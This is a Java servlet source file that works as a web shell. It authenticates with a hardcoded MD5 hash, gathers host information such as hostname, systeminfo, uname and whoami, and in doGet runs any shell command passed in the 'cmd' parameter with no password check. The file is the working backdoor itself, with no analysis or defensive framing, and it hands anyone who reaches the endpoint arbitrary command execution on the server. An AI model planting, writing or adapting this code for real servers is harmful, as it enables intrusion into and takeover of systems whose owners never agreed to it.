package utils;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


@WebServlet("/Check")
public class Check extends HttpServlet {
	private static final long serialVersionUID = 1L;

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		//Customize your hash
		String hash = "81dc9bdb52d04dc20036dbd8313ed055";
		String pass = request.getParameter("pass");

		if(getMd5(pass).equals(hash)) {
			List<Command> info = getInfo();

			request.setAttribute("info", info);
			RequestDispatcher dispatcher = request.getRequestDispatcher("/webshell.jsp");
			dispatcher.forward(request, response);
		}
		else {
			
			response.sendRedirect("index.html");
		}
	}

	
	protected void doGet (HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException 
	{
		List<Command> info = getInfo();
		String runResult = execute(request.getParameter("cmd"), true);

		request.setAttribute("info", info);
		request.setAttribute("cmd", runResult);
		RequestDispatcher dispatcher = request.getRequestDispatcher("/webshell.jsp");
		dispatcher.forward(request, response);		
	}
	
	
	
	private static List<Command> getInfo(){
		
		List<Command> info = new ArrayList<Command>();
		String OS = System.getProperty("os.name").toLowerCase();
		
		
		info.add(new Command("hostname", execute("hostname", false)));
		
		//Windows
		if(OS.contains("win")) 
		{
			//TODO
			info.add(new Command("systeminfo", execute("systeminfo", false)));
			info.add(new Command("cd", execute("cd",false)));
			info.add(new Command("echo %USERDOMAIN%\\%USERNAME%", execute("echo %USERDOMAIN%\\%USERNAME%",false)));
		}
		
		//Unix
		else
		{
			info.add(new Command("uname -a", execute("uname -a", false)));
			info.add(new Command("pwd", execute("pwd",false)));
			info.add(new Command("whoami", execute("whoami",false)));
			
			
		}
		
		
		return info;

	}

	private static String execute(String command, boolean space) {
		String output = "";
		if (command != null) {
			String s = null;
			try {
				Process p = Runtime.getRuntime().exec(command, null, null);
				BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
				while ((s = sI.readLine()) != null) {
					if(space)
						output += s + "\n";
					else
						output += s;
						

				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return output;
	}


	private static String getMd5(String input) 
	{ 
		try { 
			MessageDigest md = MessageDigest.getInstance("MD5"); 
			byte[] messageDigest = md.digest(input.getBytes()); 
			BigInteger no = new BigInteger(1, messageDigest);
			String hashtext = no.toString(16); 
			while (hashtext.length() < 32) { 
				hashtext = "0" + hashtext; 
			} 
			return hashtext; 
		}
		catch (NoSuchAlgorithmException e) { 
			throw new RuntimeException(e); 
		} 
	} 
}